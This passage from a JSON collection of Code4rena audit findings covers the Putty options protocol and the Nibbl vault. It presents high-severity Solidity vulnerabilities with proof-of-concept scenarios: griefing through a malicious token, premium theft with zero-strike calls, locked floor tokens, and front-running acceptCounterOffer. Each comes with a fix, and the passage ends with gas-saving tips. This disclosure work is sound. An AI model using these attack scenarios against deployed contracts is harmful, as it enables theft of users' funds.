doesn't require the user to be dumb or act recklessly but just normal functioning of the protocol. The fake token shouldn't prevent the user from exercising the real BAYC.\n> \n> Partial exercising of options could be a feature, but opens up new attack surfaces and would be a non-trivial to implement. It is a limitation of the protocol that should be clearly communicated to users.\n\n**hyh (warden) reviewed mitigation:**\n > Now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThis bug report concerns the PuttyV2.sol contract, which is part of the code-423n4/2022-06-putty repository. An attacker could use this vulnerability to prevent an order from executing the exercise() or withdraw() functions by including a malicious token contract in any of the fields of the order: baseAsset, floorTokens[], erc20Assets[], or erc721Assets[]. This would allow the attacker to benefit by preventing orders from being exercised if they are in an undesirable position, and also prevent the other user from claiming any of the NFTs or ERC20 tokens that are owed to them.\n\nThe vulnerability is present because any of the transfers in the exercise() function make external calls to untrusted addresses. The attacker must control one of these contracts and have it set as a malicious ERC20/ERC721 function that fails under attacker-controlled conditions.\n\nTo mitigate this vulnerability, the system could consider whitelisting approved ERC20 token or ERC721 address contracts to prevent users from setting malicious token contracts. However, this remediation would require significant admin input and incur gas trade-offs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/50",
      "tags": [],
      "finders": [
        "csanuragjain",
        "sashiketh",
        "unforgiven",
        "cccz",
        "Kenshin",
        "pedroais",
        "itsmeSTYJ",
        "kirk-baird",
        "hansfriese",
        "chatch",
        "hyh",
        "Alex the Entreprenerd",
        "xiaoming90_",
        "0xA5DF"
      ]
    },
    {
      "id": "2933",
      "title": "[H-04] Zero strike call options can be systemically used to steal premium from the taker",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by hansfriese_\n\nSome non-malicious ERC20 do not allow for zero amount transfers and order.baseAsset can be such an asset. Zero strike calls are valid and common enough derivative type. However, the zero strike calls with such baseAsset will not be able to be exercised, allowing maker to steal from the taker as a malicious maker can just wait for expiry and withdraw the assets, effectively collecting the premium for free. The premium of zero strike calls are usually substantial.\n\nMarking this as high severity as in such cases malicious maker knowing this specifics can steal from taker the whole premium amount. I.e. such orders will be fully valid for a taker from all perspectives as inability to exercise is a peculiarity of the system which taker in the most cases will not know beforehand.\n\n### Proof of Concept\n\nCurrently system do not check the strike value, unconditionally attempting to transfer it:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n```solidity\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n```\n\nAs a part of call exercise logic:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L422-L443>\n\n```solidity\n    function exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n        ...\n\n        if (order.isCall) {\n            // -- exercising a call option\n\n            // transfer strike from exerciser to putty\n            // handle the case where the taker uses native ETH instead of WETH to pay the strike\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the strike\n                require(msg.value == order.strike, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH\n                // we convert the strike ETH to WETH so that the logic in withdraw() works\n                // - because withdraw() assumes an ERC20 interface on the base asset.\n                IWETH(weth).deposit{value: msg.value}();\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n\n            // transfer assets from putty to exerciser\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[uint256(orderHash)]);\n        }\n```\n\nSome tokens do not allow zero amount transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nThis way for such a token and zero strike option the maker can create short call order, receive the premium:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L327-L339>\n\n```solidity\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the premium\n                require(msg.value == order.premium, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH and send premium to maker\n                // converting to WETH instead of forwarding native ETH to the maker has two benefits;\n                // 1) active market makers will mostly be using WETH not native ETH\n                // 2) attack surface for re-entrancy is reduced\n                IWETH(weth).deposit{value: msg.value}();\n                IWETH(weth).transfer(order.maker, msg.value);\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n            }\n```\n\nTransfer in the assets:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L366-L371>\n\n```solidity\n        // filling short call: transfer assets from maker to contract\n        if (!order.isLong && order.isCall) {\n            _transferERC20sIn(order.erc20Assets, order.maker);\n            _transferERC721sIn(order.erc721Assets, order.maker);\n            return positionId;\n        }\n```\n\nAnd wait for expiration, knowing that all attempts to exercise will revert:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n```solidity\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n```\n\nThen recover her assets:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L508-L519>\n\n```solidity\n        // transfer assets from putty to owner if put is exercised or call is expired\n        if ((order.isCall && !isExercised) || (!order.isCall && isExercised)) {\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n\n            // for call options the floor token ids are saved in the long position in fillOrder(),\n            // and for put options the floor tokens ids are saved in the short position in exercise()\n            uint256 floorPositionId = order.isCall ? longPositionId : uint256(orderHash);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]);\n\n            return;\n        }\n```\n\n### Recommended Mitigation Steps\n\nConsider checking that strike is positive before transfer in all the cases, for example:\n\n```solidity\n            } else {\n+               if (order.strike > 0) {\n                    ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n+               }\n            }\n```\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1174522101):**\n > Seems contingent on token implementation, however certain ERC20 do revert on 0 transfer and there would be no way to exercise the contract in that case.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1178989277):**\n > Report: Cannot exercise call contract if strike is 0 and baseAsset reverts on 0 transfers.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1182684476):**\n > There is a pre-requisite for the ERC20 token to revert on 0 amount transfers. However, the warden raised a key point: zero strike calls are common, and their premium is substantial. The information asymmetry of the ERC20 token between the maker and taker is another aggravating factor.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1185410362):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/3.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by conditioning call's logic on `order.strike > 0`. There is no use case for zero strike puts and so this case remains unconditioned, i.e. still always require successful `order.strike` transfer. \n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol contract which allows malicious makers to steal from takers. This vulnerability is caused by the code not checking the strike value and attempting to transfer it unconditionally. This is a problem because some tokens do not allow zero amount transfers, meaning malicious makers can create short call orders, receive the premium, transfer in the assets, and wait for expiration without being able to exercise the option, allowing them to effectively steal the premium. To mitigate this vulnerability, the code should check that the strike is positive before transferring it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/418",
      "tags": [],
      "finders": [
        "hyh",
        "hansfriese"
      ]
    },
    {
      "id": "2932",
      "title": "[H-03] Create a short call order with non empty floor makes the option impossible to exercise and withdraw",
      "impact": "HIGH",
      "content": "_Submitted by zzzitron, also found by danb, Kenshin, Metatron, minhquanym, and PwnedNoMore_\n\n**HIGH** - assets can be lost\n\nIf a short call order is created with non empty floorTokens array, the taker cannot exercise. Also, the maker cannot withdraw after the expiration. The maker will still get premium when the order is filled. If the non empty floorTokens array was included as an accident, it is a loss for both parties: the taker loses premium without possible exercise, the maker loses the locked ERC20s and ERC721s.\n\nThis bug is not suitable for exploitation to get a 'free' premium by creating not exercisable options, because the maker will lose the ERC20s and ERC721s without getting any strike. In that sense it is similar but different issue to the `Create a short put order with zero tokenAmount makes the option impossible to exercise`, therefore reported separately.\n\n### Proof of Concept\n\n*   [proof of concept](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L153-L202)\n*   [reference case](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L194-L21://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L204-L226)\n\nThe proof of concept shows a scenario where babe makes an short call order with non empty `floorTokens` array. Bob filled the order, and now he has long call option NFT. He wants to exercise his option and calls `exercise`. There are two cases.\n\n*   case 1: he calls exercise with empty `floorAssetTokenIds` array\n*   case 2: he calls exercise with non-empty `floorAssetTokenIds` array with matching length to the `orders.floorTokens`\n\nIn the case1, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), and his call passes this requirement. But eventually `_transferFloorsIn` was called and he gets `Index out of bounds` error, because `floorTokens` is not empty [which does not match with empty `floorAssetTokenIds`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L627-L629).\n\n```solidity\n// case 1\n  // PuttyV2.sol: _transferFloorsIn called by exercise\n  // The floorTokens and floorTokenIds do not match the lenghts\n  // floorTokens.length is not zero, while floorTokenIds.length is zero\n\n       ERC721(floorTokens[i]).safeTransferFrom(from, address(this), floorTokenIds[i]);\n```\n\nIn the case2, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), but it is not empty. So it reverts.\n\n    // case2\n    // PuttyV2.sol: exercise\n    // non empty floorAssetTokenIds array is passed for put option, it will revert\n\n            !order.isCall\n                ? require(floorAssetTokenIds.length == order.floorTokens.length, \"Wrong amount of floor tokenIds\")\n                : require(floorAssetTokenIds.length == 0, \"Invalid floor tokenIds length\");\n\nAfter the option is expired, the maker - babe is trying to withdraw but fails due to the [same issue with the case1](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L516).\n\n```solidity\n// maker trying to withdraw\n// PuttyV2.sol: withdraw\n\n  _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]);\n```\n\nNote on the PoC:\n\n*   The [test for case1 is commented out](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L182-L183) because foundry could not catch the revert. But by running the test with un-commenting these lines will show that the call reverts with `Index out of bounds`.\n*   For the same reason the [withdraw](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L199-L200) also is commented out\n*   The reference case just shows that it works as intended when the order does not contain non-empty `floorTokens`.\n\n### Tools Used\n\nFoundry.\n\n### Recommended Mitigation Steps\n\nIt happens because the [`fillOrder` does not ensure](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L296-L298) the `order.floorTokens` to be empty when the order is short call.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1174764713):**\n > Note that it is possible to cause loss of funds for others through this.\n> \n> Assume that maker (A) creates a long call and taker (B) fills it, transferring floor tokens (XYZ) into putty. \n> \n> If maker (C) creates a short call with floorTokens (XYZ), taker (D) is able to fill and exercise his long call since XYZ already resides on Putty. This will however invalidate the options pair that was created between A and B since A cannot exercise and B cannot withdraw.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1178995529):**\n > Agree that this should be marked as high severity given the exploit scenario provided by @STYJ above.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1178995764):**\n > Report: Short call with floorTokens will result in a revert when exercising.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1181790939):**\n > Agreed, all wardens gave the same scenario that leads to a direct loss of NFTs and premium, but @STYJ's exploit scenario raises the gravity of the situation since users can be griefed.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1185411060):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/1.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by prohibiting non-empty `order.floorTokens` for short calls.\n >\n > Other option types do need `floorTokens`: long calls' taker provides floor tokens on filling, while long put owner brings in the floor tokens on exercise, taking the strike. Short put owner can thereafter retrieve the tokens on withdraw.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol code on the code-423n4/2022-06-putty repository. If a short call order is created with a non-empty floorTokens array, the taker cannot exercise the option and the maker cannot withdraw after the expiration. This means that both parties lose out: the taker loses premium without possible exercise, and the maker loses the locked ERC20s and ERC721s. The proof of concept provided shows two scenarios: the first is where the input floorAssetTokenIds are checked to be empty for put orders, but the call passes this requirement and eventually causes an Index out of bounds error. The second is where the input floorAssetTokenIds are checked to be empty, but are not empty and thus revert. After expiration, the maker trying to withdraw also fails due to the same issue. The tools used to discover this bug were foundry. The recommended mitigation steps are to ensure that the fillOrder does not have a non-empty floorTokens array when the order is a short call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/369",
      "tags": [],
      "finders": [
        "danb",
        "Metatron",
        "minhquanym",
        "zzzitron",
        "Kenshin",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2931",
      "title": "[H-02] acceptCounterOffer() May Result In Both Orders Being Filled",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584\n\n\n## Vulnerability details\n\n## Impact\n\nWhen a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.\n\nThe impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.\n\n## Proof of Concept\n\n[acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled.\n```solidity\n    function acceptCounterOffer(\n        Order memory order,\n        bytes calldata signature,\n        Order memory originalOrder\n    ) public payable returns (uint256 positionId) {\n        // cancel the original order\n        cancel(originalOrder);\n\n\n        // accept the counter offer\n        uint256[] memory floorAssetTokenIds = new uint256[](0);\n        positionId = fillOrder(order, signature, floorAssetTokenIds);\n    }\n```\n\n[cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding.\n```solidity\n    function cancel(Order memory order) public {\n        require(msg.sender == order.maker, \"Not your order\");\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // mark the order as cancelled\n        cancelledOrders[orderHash] = true;\n\n\n        emit CancelledOrder(orderHash, order);\n    }\n```\n\nTherefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.\n\n## Recommended Mitigation Steps\n\nConsider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol smart contract. When a user attempts to accept a counter offer, it is possible for an attacker or any other user to fill the original order before the acceptCounterOffer() function cancels it. This means both the original order and the new order will be filled, leaving the user twice as leveraged as they intended to be. The vulnerability is caused by the cancel() function not reverting if an order has already been filled. To mitigate this vulnerability, the cancel() function should be modified to revert if an order has already been filled by adding the line \"require(_ownerOf[uint256(orderHash)] == 0)\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/44",
      "tags": [],
      "finders": [
        "csanuragjain",
        "minhquanym",
        "Lambda",
        "kirk-baird",
        "hansfriese"
      ]
    },
    {
      "id": "2930",
      "title": "[H-01] Fee is being deducted when Put is expired and not when it is exercised.",
      "impact": "HIGH",
      "content": "_Submitted by zishansami, also found by 0x52, 0xsanson, auditor0517, berndartmueller, csanuragjain, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451>\n\n### Impact\n\nFee is being deducted when Put is expired and not when it is exercised in `PuttyV2.sol`.\nComment section of the `setFee()` function mentions `\"fee rate that is applied on exercise\"` which signifies that the fee amount is meant to be deducted from strike only when a position is being exercised (or has been exercised).\n\nBut, in function `withdraw()` at [PuttyV2.solL#495-L503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503)  the fee is being deducted even when the Put position is not exercised and has expired.\n\nAlso, in function `exercise()` there is no fee deduction from the `order.strike` when the Put position is exercised and the strike is being transferred to the caller ([PuttyV2.solL#451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451)).\n\nThis unintended deduction from assets of Put Shorter and the absence of fee deduction from strike when Put is exercised are directly impacting the assets and therefore marked as Medium Risk.\n\n### Proof of Concept\n\n`if` condition present at [PuttyV2.solL#495](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495) passes if `order.isCall` is `false` and `isExercised` is false.\n\n`feeAmount` becomes positive if `fee > 0` and it gets deducted from the `order.strike` which gets transferred to `msg.sender` at line number [PuttyV2.solL#503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L503).\n\n### Recommended Mitigation Steps\n\n1.  Update `if` condition at [PuttyV2.sol#L498](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L498) with `(fee > 0 && order.isCall && isExercised)`\n\n2.  Add feeAmount calculation and deduction after put is exercised and strike is transferred at [PuttyV2.sol#L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451) as follows:\n\n```solidity\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n    ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n}\nERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n```\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1178999683):**\n > Report: Fees are only applied on puts if they are expired.\n\n**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1179899567):**\n > Due to incorrect logic, there are 2 consequences of separate severities:\n> \n> 1) Expired put option being charged the admin fee. As @berndartmueller mentioned in [#380](https://github.com/code-423n4/2022-06-putty-findings/issues/380), the fee should be charged on the premium (actually this is another issue, see [#373](https://github.com/code-423n4/2022-06-putty-findings/issues/373)). Since it is possible for the fee amount to be greater than expected, I consider this to be a loss of assets and therefore given a high severity rating.\n> \n> 2) Put option not being charged fee upon exercising it. This can be considered to the \"protocol leaked value\" and thus be given a medium severity rating.\n> \n> Issues that mention (1) or both (1) and (2) will be given a high severity rating, those that mention only (2) will be given a medium.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1185405136):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by changing the fee base to be `order.premium` [`PR#4`](https://github.com/outdoteth/putty-v2/pull/4), which is now paid uniformly for all option types on order filling. Utilizing `order.strike` as the fee base was the root cause for [M-04](https://github.com/code-423n4/2022-06-putty-findings/issues/285), [M-06](https://github.com/code-423n4/2022-06-putty-findings/issues/296), [M-11](https://github.com/code-423n4/2022-06-putty-findings/issues/422), [M-15](https://github.com/code-423n4/2022-06-putty-findings/issues/373), so the change to `order.premium` was a shared mitigation for all of them.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of PuttyV2.sol, a contract written in the Solidity programming language. The vulnerability affects how fees are deducted when a Put position is exercised or expired. The code shows that fees are deducted when the position is expired, but not when it is exercised. This unintended deduction of assets from Put Shorter and the absence of fee deduction from strike when Put is exercised are directly impacting the assets and therefore marked as Medium Risk.\n\nTo fix this vulnerability, it is recommended to update the if condition at PuttyV2.sol#L498 with (fee > 0 && order.isCall && isExercised). Additionally, feeAmount calculation and deduction should be added after the Put is exercised and the strike is transferred at PuttyV2.sol#L451.\n\nThis bug report was done using manual analysis.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/269",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "csanuragjain",
        "0x52",
        "0xsanson",
        "auditor0517",
        "zishansami",
        "berndartmueller",
        "zzzitron"
      ]
    },
    {
      "id": "42729",
      "title": "[23] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 8 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n99:       function proposeNewBasketImplementation(address _newBasketImplementation) external override onlyRole(IMPLEMENTER_ROLE) {\n\n123:      function proposeNewAdminFeeAddress(address _newFeeAddress) external override onlyRole(FEE_ROLE) {\n\n140:      function proposeNewAdminFee(uint256 _newFee) external override onlyRole(FEE_ROLE) {\n\n158:      function proposeNewVaultImplementation(address _newVaultImplementation) external override onlyRole(IMPLEMENTER_ROLE) {\n\n173:      function pause() external onlyRole(PAUSER_ROLE) override {\n\n179:      function unPause() external onlyRole(PAUSER_ROLE) override {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L99>\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol\n\n32:       function setRoleAdmin(bytes32 _role, bytes32 _adminRole) external override onlyRole(getRoleAdmin(_role)) {\n\n40:       function proposeGrantRole(bytes32 _role, address _to) external override onlyRole(getRoleAdmin(_role)) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L32>\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42728",
      "title": "[22] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**\\~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hitby [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 41 instances of this issue:*\n\n[See original submission](https://github.com/code-423n4/2022-06-nibbl-findings/issues/140) for details.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42727",
      "title": "[21] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n114:      receive() external payable {}\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L114>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n183:      receive() payable external {    }\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L183>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n585:      receive() external payable {}\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L585>\n\n```solidity\nFile: contracts/Proxy/ProxyBasket.sol\n\n56:       receive() external payable {    }\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L56>\n\n```solidity\nFile: contracts/Proxy/ProxyVault.sol\n\n56:       receive() external payable {    }\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L56>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42726",
      "title": "[20] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n42:           require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L42>\n\n```solidity\nFile: contracts/NibblVault.sol   #2\n\n486:          require(msg.sender == curator,\"NibblVault: Only Curator\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L486>\n\n```solidity\nFile: contracts/NibblVault.sol   #3\n\n505:          require(msg.sender == bidder,\"NibblVault: Only winner\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L505>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42725",
